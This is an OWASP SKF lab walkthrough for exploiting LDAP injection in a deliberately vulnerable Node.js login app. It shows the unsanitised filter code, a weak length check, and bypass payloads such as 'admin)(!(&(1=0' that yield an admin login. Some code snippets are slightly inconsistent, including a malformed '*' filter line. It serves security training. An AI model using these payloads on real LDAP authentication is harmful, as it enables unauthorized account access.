# Ldap Injection - harder

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:js-ldap-injection-harder
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:js-ldap-injection-harder
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.

Let's open the app.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Ldap-harder/1.png)

Trying to loggin with a random username and password.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Ldap-harder/2.png)

The application architecture that supports LDAP includes both server-side and client-side components. The LDAP queries submitted to the server are known as LDAP search filters, which are constructed using prefix notation. Below is an example of an LDAP search filter:

```text
find("(&(cn=" + username +")(userPassword=" + pass +"))")
```

This prefix filter notation instructs the query to find an LDAP node with the given username and password.

## Exploitation

Let's check the app.js file.

```javascript
const options = {
  scope: "sub",
  filter: "(&(cn=" + username + ")(sn=" + password + "))",
};
```

We can see that the filter is constructed by concatenating the username and password directly into the filter without proper sanitization. If we replace the username and password with a special character we can bypass authentication controls. Using \* as the username and password will result in a successful login.

```javascript
filter: "(&(cn=" * ")(sn=" * "))";
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Ldap-harder/3.png)

No luck, maybe this application is sanitizing the user input somehow, let's check the code again.

```javascript
app.post("/login", upload.none(), (req, res) => {
  const secret = req.body.secret_answer;
  secret.length < 2
    ? res.render("index", { result: "Invalid username or password" })
    : authenticate(req, res);
});
```

The approach here to avoid LdaP injection was to check for the length of the user input. If the length is less than 2, the user input is invalid.
Unfortunately for the developer, this approach is not very secure. Special characters other than "\*" can also be used to create malicious queries.

```text
username = admin)(!(&(1=0
password = q))
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Ldap-harder/4.png)

We successfully logged in as the Admin.

## Additional sources

{% embed url="https://owasp.org/www-community/attacks/LDAP_Injection" %}

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html" %}

{% embed url="https://www.synopsys.com/glossary/what-is-ldap-injection.html" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md" %}
